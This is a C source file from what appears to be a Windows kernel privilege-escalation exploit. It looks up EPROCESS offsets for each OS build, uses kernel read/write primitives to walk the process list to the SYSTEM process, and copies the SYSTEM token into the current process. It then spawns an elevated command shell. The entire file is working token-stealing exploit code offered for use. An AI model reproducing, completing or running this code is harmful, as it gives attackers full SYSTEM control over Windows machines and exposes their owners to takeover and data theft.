#include "token.h"
#include "leak.h"

int resolve_offsets(EPROCESS_OFFSETS* off)
{
    RTL_OSVERSIONINFOW vi;
    fnRtlGetVersion rtlver;

    memset(off, 0, sizeof(*off));
    memset(&vi, 0, sizeof(vi));
    vi.dwOSVersionInfoSize = sizeof(vi);

    rtlver = (fnRtlGetVersion)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    if (!rtlver) {
        LOG_FAIL("resolve rtlgetversion");
        return 0;
    }

    rtlver(&vi);
    off->build = vi.dwBuildNumber;

    LOG_OK("os: %lu.%lu.%lu",
        vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);

    if (vi.dwBuildNumber >= 26100) {
        off->unique_pid = 0x448;
        off->active_links = 0x450;
        off->token = 0x4C0;
    }
    else if (vi.dwBuildNumber >= 22621) {
        off->unique_pid = 0x440;
        off->active_links = 0x448;
        off->token = 0x4B8;
    }
    else if (vi.dwBuildNumber >= 22000) {
        off->unique_pid = 0x440;
        off->active_links = 0x448;
        off->token = 0x4B8;
    }
    else if (vi.dwBuildNumber >= 19041) {
        off->unique_pid = 0x440;
        off->active_links = 0x448;
        off->token = 0x4B8;
    }
    else if (vi.dwBuildNumber >= 18362) {
        off->unique_pid = 0x2E8;
        off->active_links = 0x2F0;
        off->token = 0x360;
    }
    else {
        LOG_FAIL("unsupported build %lu", vi.dwBuildNumber);
        return 0;
    }

    LOG_OK("offsets: pid=0x%x links=0x%x token=0x%x",
        off->unique_pid, off->active_links, off->token);

    return 1;
}

int token_elevate(KRW_CTX* ctx, EPROCESS_OFFSETS* off)
{
    u64 cur_ep, sys_ep, entry, flink, sys_token, adjusted, verify;
    u32 pid;
    int i;

    cur_ep = leak_eprocess();
    if (!cur_ep) {
        LOG_FAIL("eprocess leak failed");
        return 0;
    }
    LOG_OK("current eprocess: 0x%llx", cur_ep);

    pid = krw_read32(ctx, cur_ep + off->unique_pid);
    LOG_OK("kernel read pid: %u (expected: %u)", pid, GetCurrentProcessId());

    if (pid != GetCurrentProcessId()) {
        LOG_FAIL("pid mismatch - r/w primitive not functional");
        LOG_WARN("the oob read could not reach eprocess memory");
        LOG_WARN("this requires build-specific pool spray calibration");
        return 0;
    }

    sys_ep = 0;
    entry = cur_ep;

    for (i = 0; i < 8192; i++) {
        flink = krw_read64(ctx, entry + off->active_links);
        if (!flink || flink < 0xFFFF000000000000ULL) break;

        entry = flink - off->active_links;

        pid = krw_read32(ctx, entry + off->unique_pid);
        if (pid == PID_SYSTEM) {
            sys_ep = entry;
            break;
        }
        if (entry == cur_ep) break;
    }

    if (!sys_ep) {
        LOG_FAIL("system eprocess not found");
        return 0;
    }
    LOG_OK("system eprocess: 0x%llx", sys_ep);

    sys_token = krw_read64(ctx, sys_ep + off->token);
    LOG_OK("system token: 0x%llx", sys_token);

    adjusted = sys_token & ~0xFULL;
    krw_write64(ctx, cur_ep + off->token, adjusted);

    verify = krw_read64(ctx, cur_ep + off->token);
    LOG_OK("token after swap: 0x%llx", verify);

    if ((verify & ~0xFULL) == adjusted) {
        LOG_OK("token swap successful");
        return 1;
    }

    LOG_FAIL("token swap verification failed");
    return 0;
}

int token_spawn_shell(void)
{
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);

    if (!CreateProcessW(L"C:\\Windows\\System32\\cmd.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        LOG_FAIL("spawn shell (0x%lx)", GetLastError());
        return 0;
    }

    LOG_OK("elevated shell spawned (pid: %lu)", pi.dwProcessId);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 1;
}